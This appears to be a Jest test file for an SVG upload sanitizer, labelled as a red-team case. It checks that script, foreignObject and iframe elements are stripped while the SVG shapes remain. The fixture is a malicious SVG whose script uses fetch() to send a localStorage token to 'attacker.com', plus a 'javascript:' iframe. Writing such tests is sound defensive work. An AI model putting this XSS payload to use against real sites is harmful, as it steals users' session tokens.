import { AssetSanitizerService } from '../../apps/api/src/security/asset-sanitizer.service';

describe('Red Team: Asset XSS Injection (RT-02)', () => {
  const sanitizer = new AssetSanitizerService();

  it('SHOULD STRIP: Malicious Javascript from Contributor SVG Uploads', () => {
    const maliciousPayload = `
      <svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
        <circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" />
        <script type="text/javascript">
          fetch('http://attacker.com/steal-token?q=' + localStorage.getItem('token'));
        </script>
        <foreignObject width="100" height="100">
           <body xmlns="http://www.w3.org/1999/xhtml">
             <iframe src="javascript:alert(1)"></iframe>
           </body>
        </foreignObject>
      </svg>
    `;

    const cleanedData = sanitizer.sanitizeSVG(maliciousPayload);

    // Assert the javascript is completely evaporated
    expect(cleanedData).not.toContain('<script');
    expect(cleanedData).not.toContain('fetch(');
    expect(cleanedData).not.toContain('<foreignObject');
    expect(cleanedData).not.toContain('iframe');
    
    // Assert structural SVG remains
    expect(cleanedData).toContain('<circle');
  });
});
